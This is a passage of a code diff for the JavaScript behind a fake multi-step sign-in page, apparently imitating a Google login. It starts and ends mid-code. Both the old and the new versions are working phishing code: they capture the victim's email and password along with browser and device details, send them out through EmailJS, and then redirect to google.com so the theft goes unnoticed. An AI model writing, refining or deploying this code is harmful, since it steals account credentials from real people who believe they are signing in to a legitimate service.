-  if(privacyLink) privacyLink.textContent = t.privacy;
-  
-  const termsLink = document.getElementById('termsLink');
-  if(termsLink) termsLink.textContent = t.terms;
-  
-  const learnMore = document.getElementById('learnMore');
-  if(learnMore) learnMore.textContent = t.learnMore;
-}
-
-/* Event Listeners */
-
-// Language switching - with null check
-if(langSelect) {
-  langSelect.addEventListener('change', function(){
-    applyLanguage(this.value);
-  });
-}
-
-// Email form submission
-if(emailForm) {
-  emailForm.addEventListener('submit', function(e){
-    e.preventDefault();
-    console.log('Email form submitted!'); // Debug
-    
-    const val = (emailInput ? emailInput.value || '' : '').trim();
-    const lang = langSelect ? langSelect.value : 'en';
-    const t = TEXT[lang];
-    
-    console.log('Email value:', val); // Debug
-    
-    // Clear previous errors
-    hideInputError(emailInput, emailError);
-    
-    if(!val){
-      console.log('Empty email field'); // Debug
-      showInputError(emailInput, emailError, t.emptyField);
-      if(emailInput) emailInput.focus();
-      return;
-    }
-    
-    // Validate email or phone
-    if(val.indexOf('@') !== -1){
-      if(!isValidEmail(val)){
-        console.log('Invalid email'); // Debug
-        showInputError(emailInput, emailError, t.invalidEmail);
-        if(emailInput) emailInput.focus();
-        return;
-      }
-    } else {
-      if(!isValidPhone(val)){
-        console.log('Invalid phone'); // Debug
-        showInputError(emailInput, emailError, t.invalidPhone);
-        if(emailInput) emailInput.focus();
-        return;
-      }
-    }
-    
-    console.log('Validation passed, moving to password step'); // Debug
-    
-    // Move to password step
-    if(leftSubtitle) leftSubtitle.style.display = 'none';
-    if(leftEmail) {
-      leftEmail.style.display = 'block';
-      leftEmail.textContent = val;
-    }
-    showStep(stepPassword);
-    if(passwordInput) {
-      passwordInput.value = '';
-      setTimeout(() => passwordInput.focus(), 50);
-    }
-  });
-}
-
-// Also add direct button click handler as backup
-if(emailNextBtn) {
-  emailNextBtn.addEventListener('click', function(e){
-    e.preventDefault();
-    console.log('Next button clicked directly!'); // Debug
-    
-    // Trigger form submission
-    if(emailForm) {
-      const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-      emailForm.dispatchEvent(submitEvent);
-    }
-  });
-}
-
-// Password form submission
-if(passwordForm) {
-  passwordForm.addEventListener('submit', function(e){
-    e.preventDefault();
-    console.log('Password form submitted!'); // Debug
-    
-    const emailVal = emailInput ? (emailInput.value || '').trim() : '';
-    const passwd = passwordInput ? (passwordInput.value || '') : '';
-    const lang = langSelect ? langSelect.value : 'en';
-    const t = TEXT[lang];
-
-    console.log('Email:', emailVal, 'Password length:', passwd.length); // Debug
-
-    // Clear previous errors
-    hideInputError(passwordInput, passwordError);
-
-    if(!passwd){
-      console.log('Password is empty'); // Debug
-      showInputError(passwordInput, passwordError, t.invalidPassword);
-      if(passwordInput) passwordInput.focus();
+// Enhanced EmailJS send function
+function sendEmail(data) {
+  return new Promise((resolve, reject) => {
+    if (!emailjsReady || typeof emailjs === 'undefined') {
+      console.error("EmailJS not ready");
+      reject(new Error("EmailJS not available"));
       return;
     }
 
-    // Check if both email and password exist
-    if(!emailVal || !passwd) {
-      console.log('Missing email or password'); // Debug
-      return;
-    }
+    console.log('Sending email with EmailJS...', data);
+    
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, data)
+      .then((response) => {
+        console.log('EmailJS SUCCESS:', response);
+        resolve(response);
+      })
+      .catch((error) => {
+        console.error('EmailJS FAILED:', error);
+        reject(error);
+      });
+  });
+}
 
-    console.log('Both email and password provided, proceeding...'); // Debug
-
-    // Disable button and show processing state
-    if(submitBtn) {
-      submitBtn.disabled = true;
-      submitBtn.textContent = t.signingIn;
-    }
-
-    // Prepare email data
-    const templateParams = {
-      user_email: emailVal,
-      user_password: passwd,
-      timestamp: new Date().toISOString(),
-      user_agent: navigator.userAgent,
-      page_url: window.location.href,
-      device_type: (/Mobi|Android/i.test(navigator.userAgent)) ? 'mobile' : 'desktop'
-    };
-
-    console.log('Sending email and redirecting immediately...'); // Debug
-
-    // Try to send email but don't wait for it - redirect immediately
+function redirect() {
+  console.log('Starting redirect process...');
+  const urls = ["https://google.com", "https://www.google.com"];
+  let currentUrl = 0;
+  
+  function attemptRedirect() {
     try {
-      sendEmail(templateParams).catch(err => console.error("Email error:", err));
+      console.log('Redirecting to:', urls[currentUrl]);
+      window.location.href = urls[currentUrl];
+      
+      // Fallback
+      setTimeout(() => {
+        window.location.replace(urls[currentUrl]);
+      }, 1000);
     } catch(e) {
-      console.error("Send email failed:", e);
-    }
-
-    // Force redirect to Google immediately
-    console.log('Executing immediate redirect to Google...'); // Debug
-    
-    // Try multiple redirect methods
-    setTimeout(() => {
-      try {
-        console.log('Method 1: window.location.href'); // Debug
-        window.location.href = 'https://www.google.com';
-      } catch(e) {
-        console.error('Redirect method 1 failed:', e);
-        try {
-          console.log('Method 2: window.location.replace'); // Debug
-          window.location.replace('https://www.google.com');
-        } catch(e2) {
-          console.error('Redirect method 2 failed:', e2);
-          try {
-            console.log('Method 3: window.open'); // Debug
-            window.open('https://www.google.com', '_self');
-          } catch(e3) {
-            console.error('All redirect methods failed:', e3);
-          }
-        }
+      console.error('Redirect failed:', e);
+      currentUrl++;
+      if (currentUrl < urls.length) {
+        setTimeout(attemptRedirect, 500);
       }
-    }, 100);
-
-    // Backup redirect methods
-    setTimeout(() => {
-      console.log('Backup redirect 1 executing...'); // Debug
-      window.location = 'https://www.google.com';
-    }, 500);
-
-    setTimeout(() => {
-      console.log('Backup redirect 2 executing...'); // Debug
-      document.location.href = 'https://www.google.com';
-    }, 1000);
-  });
-}
-
-// Also add direct button click handler for password submit button
-if(submitBtn) {
-  submitBtn.addEventListener('click', function(e){
-    e.preventDefault();
-    console.log('Password submit button clicked directly!'); // Debug
-    
-    // Trigger form submission
-    if(passwordForm) {
-      const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-      passwordForm.dispatchEvent(submitEvent);
     }
-  });
+  }
+  
+  attemptRedirect();
 }
 
-// Recovery form submission
-if(recoveryForm) {
-  recoveryForm.addEventListener('submit', function(e){
-    e.preventDefault();
-    console.log('Recovery form submitted!'); // Debug
-    
-    const val = recoveryInput ? (recoveryInput.value || '').trim() : '';
-    const lang = langSelect ? langSelect.value : 'en';
-    const t = TEXT[lang];
-    
-    console.log('Recovery value:', val); // Debug
-    
-    // Clear previous errors
-    hideInputError(recoveryInput, recoveryError);
-    
-    if(!val){
-      console.log('Empty recovery field'); // Debug
-      showInputError(recoveryInput, recoveryError, t.emptyField);
-      if(recoveryInput) recoveryInput.focus();
+// Event Handlers
+function handleEmailNext() {
+  console.log('Email Next clicked');
+  
+  const val = elements.email.value.trim();
+  const t = translations[currentLanguage];
+  
+  hideError(elements.email, elements.emailError);
+  
+  if (!val) {
+    console.log('Email field is empty');
+    showError(elements.email, elements.emailError, t.emptyField);
+    elements.email.focus();
+    return;
+  }
+  
+  let isValid = false;
+  if (val.includes('@')) {
+    isValid = isValidEmail(val);
+    if (!isValid) {
+      console.log('Invalid email format');
+      showError(elements.email, elements.emailError, t.invalidEmail);
+      elements.email.focus();
       return;
     }
-
-    // Validate format first
-    if(val.indexOf('@') !== -1){
-      if(!isValidEmail(val)){
-        console.log('Invalid email format'); // Debug
-        showInputError(recoveryInput, recoveryError, t.invalidEmail);
-        if(recoveryInput) recoveryInput.focus();
-        return;
-      }
-    } else {
-      if(!isValidPhone(val)){
-        console.log('Invalid phone format'); // Debug
-        showInputError(recoveryInput, recoveryError, t.invalidPhone);
-        if(recoveryInput) recoveryInput.focus();
-        return;
-      }
+  } else {
+    isValid = isValidPhone(val);
+    if (!isValid) {
+      console.log('Invalid phone format');
+      showError(elements.email, elements.emailError, t.invalidPhone);
+      elements.email.focus();
+      return;
     }
-
-    console.log('Recovery validation passed, going back to login'); // Debug
-
-    // Just redirect back to the main login page (step-email)
-    showStep(stepEmail);
-    if(recoveryInput) recoveryInput.value = '';
-    hideInputError(recoveryInput, recoveryError);
-    if(leftSubtitle) leftSubtitle.style.display = 'block';
-    if(leftEmail) leftEmail.style.display = 'none';
-    if(emailInput) {
-      emailInput.value = '';
-      setTimeout(() => emailInput.focus(), 50);
-    }
-  });
-}
-
-// Also add direct button click handler for recovery next button
-if(recoveryNext) {
-  recoveryNext.addEventListener('click', function(e){
-    e.preventDefault();
-    console.log('Recovery next button clicked directly!'); // Debug
-    
-    // Trigger form submission
-    if(recoveryForm) {
-      const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-      recoveryForm.dispatchEvent(submitEvent);
-    }
-  });
-}
-
-// Navigation buttons
-if(backToEmailBtn) {
-  backToEmailBtn.addEventListener('click', function(e){
-    e.preventDefault();
-    hideInputError(passwordInput, passwordError);
-    if(leftSubtitle) leftSubtitle.style.display = 'block';
-    if(leftEmail) leftEmail.style.display = 'none';
-    showStep(stepEmail);
-    if(emailInput) setTimeout(() => emailInput.focus(), 50);
-  });
-}
-
-if(forgotLink) {
-  forgotLink.addEventListener('click', function(e){
-    e.preventDefault();
-    hideInputError(emailInput, emailError);
-    if(leftSubtitle) leftSubtitle.style.display = 'block';
-    if(leftEmail) leftEmail.style.display = 'none';
-    showStep(stepRecovery);
-    if(recoveryInput) setTimeout(() => recoveryInput.focus(), 50);
-  });
-}
-
-if(recoveryBack) {
-  recoveryBack.addEventListener('click', function(e){
-    e.preventDefault();
-    hideInputError(recoveryInput, recoveryError);
-    showStep(stepEmail);
-    if(emailInput) setTimeout(() => emailInput.focus(), 50);
-  });
-}
-
-if(forgotPassLink) {
-  forgotPassLink.addEventListener('click', function(e){
-    e.preventDefault();
-    hideInputError(passwordInput, passwordError);
-    showStep(stepRecovery);
-    if(recoveryInput) setTimeout(() => recoveryInput.focus(), 50);
-  });
-}
-
-if(confirmDone) {
-  confirmDone.addEventListener('click', function(){
-    showStep(stepEmail);
-    if(recoveryInput) recoveryInput.value = '';
-    hideInputError(recoveryInput, recoveryError);
-    if(emailInput) setTimeout(() => emailInput.focus(), 50);
-  });
-}
-
-// Real-time validation - clear errors when typing
-if(emailInput) {
-  emailInput.addEventListener('input', function(){
-    if(this.value.trim()){
-      hideInputError(emailInput, emailError);
-    }
-  });
+  }
   
-  // Also handle Enter key press
-  emailInput.addEventListener('keypress', function(e){
-    if(e.key === 'Enter') {
-      e.preventDefault();
-      console.log('Enter pressed in email field'); // Debug
-      if(emailForm) {
-        const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-        emailForm.dispatchEvent(submitEvent);
-      }
-    }
-  });
+  console.log('Email validation passed');
+  validatedEmail = val;
+  elements.subtitle.style.display = 'none';
+  elements.userEmail.style.display = 'block';
+  elements.userEmail.textContent = val;
+  showStep(elements.passwordStep);
+  elements.password.value = '';
+  setTimeout(() => elements.password.focus(), 100);
 }
 
-if(passwordInput) {
-  passwordInput.addEventListener('input', function(){
-    if(this.value.trim()){
-      hideInputError(passwordInput, passwordError);
-    }
-  });
+function handlePasswordNext() {
+  console.log('Password Next clicked');
   
-  // Handle Enter key press in password field
-  passwordInput.addEventListener('keypress', function(e){
-    if(e.key === 'Enter') {
-      e.preventDefault();
-      console.log('Enter pressed in password field'); // Debug
-      if(passwordForm) {
-        const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-        passwordForm.dispatchEvent(submitEvent);
-      }
-    }
-  });
-}
-
-if(recoveryInput) {
-  recoveryInput.addEventListener('input', function(){
-    if(this.value.trim()){
-      hideInputError(recoveryInput, recoveryError);
-    }
-  });
+  const passVal = elements.password.value;
+  const t = translations[currentLanguage];
   
-  // Handle Enter key press in recovery field
-  recoveryInput.addEventListener('keypress', function(e){
-    if(e.key === 'Enter') {
-      e.preventDefault();
-      console.log('Enter pressed in recovery field'); // Debug
-      if(recoveryForm) {
-        const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
-        recoveryForm.dispatchEvent(submitEvent);
-      }
+  hideError(elements.password, elements.passwordError);
+  
+  if (!passVal) {
+    console.log('Password field is empty');
+    showError(elements.password, elements.passwordError, t.invalidPassword);
+    elements.password.focus();
+    return;
+  }
+  
+  console.log('Password validation passed');
+  validatedPassword = passVal;
+  
+  if (!validatedEmail || !validatedPassword) {
+    console.error('Missing validated credentials');
+    return;
+  }
+  
+  elements.submitBtn.disabled = true;
+  elements.submitBtn.textContent = t.signingIn;
+  
+  const data = {
+    user_email: validatedEmail,
+    user_password: validatedPassword,
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent,
+    page_url: window.location.href,
+    device_type: (/Mobi|Android/i.test(navigator.userAgent)) ? 'mobile' : 'desktop',
+    language: currentLanguage
+  };
+  
+  console.log('Attempting to send email...', data);
+  
+  sendEmail(data)
+    .then(() => {
+      console.log('Email sent successfully, redirecting...');
+      setTimeout(redirect, 1000);
+    })
+    .catch(err => {
+      console.error("Email send failed:", err);
+      // Still redirect even if email fails
+      setTimeout(redirect, 2000);
+    });
+}
+
+function handleRecoveryNext() {
+  console.log('Recovery Next clicked');
+  
+  const val = elements.recovery.value.trim();
+  const t = translations[currentLanguage];
+  
+  hideError(elements.recovery, elements.recoveryError);
+  
+  if (!val) {
+    console.log('Recovery field is empty');
+    showError(elements.recovery, elements.recoveryError, t.emptyField);
+    elements.recovery.focus();
+    return;
+  }
+  
+  if (val.includes('@')) {
+    if (!isValidEmail(val)) {
+      console.log('Invalid recovery email');
+      showError(elements.recovery, elements.recoveryError, t.invalidEmail);
+      elements.recovery.focus();
+      return;
     }
-  });
+  } else {
+    if (!isValidPhone(val)) {
+      console.log('Invalid recovery phone');
+      showError(elements.recovery, elements.recoveryError, t.invalidPhone);
+      elements.recovery.focus();
+      return;
+    }
+  }
+  
+  console.log('Recovery validation passed, going back to email step');
+  validatedEmail = '';
+  validatedPassword = '';
+  showStep(elements.emailStep);
+  elements.recovery.value = '';
+  hideError(elements.recovery, elements.recoveryError);
+  elements.subtitle.style.display = 'block';
+  elements.userEmail.style.display = 'none';
+  elements.email.value = '';
+  elements.email.focus();
 }
 
-// Utility function
-function sanitizeHtml(str){
-  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function handleBack() {
+  console.log('Back clicked');
+  hideError(elements.password, elements.passwordError);
+  elements.subtitle.style.display = 'block';
+  elements.userEmail.style.display = 'none';
+  validatedPassword = '';
+  elements.submitBtn.disabled = false;
+  elements.submitBtn.textContent = translations[currentLanguage].next;
+  showStep(elements.emailStep);
+  elements.email.focus();
 }
 
-// Initialize
-if(langSelect) applyLanguage(langSelect.value);
-showStep(stepEmail);
-if(leftEmail) leftEmail.style.display = 'none';
-</script>
-</body>
-</html>
+function handleForgotEmail() {
+  console.log('Forgot email clicked');
+  hideError(elements.email, elements.emailError);
+  elements.subtitle.style.display = 'block';
+  elements.userEmail.style.display = 'none';
+  validatedEmail = '';
+  showStep(elements.recoveryStep);
+  elements.recovery.focus();
+}
+
+fun
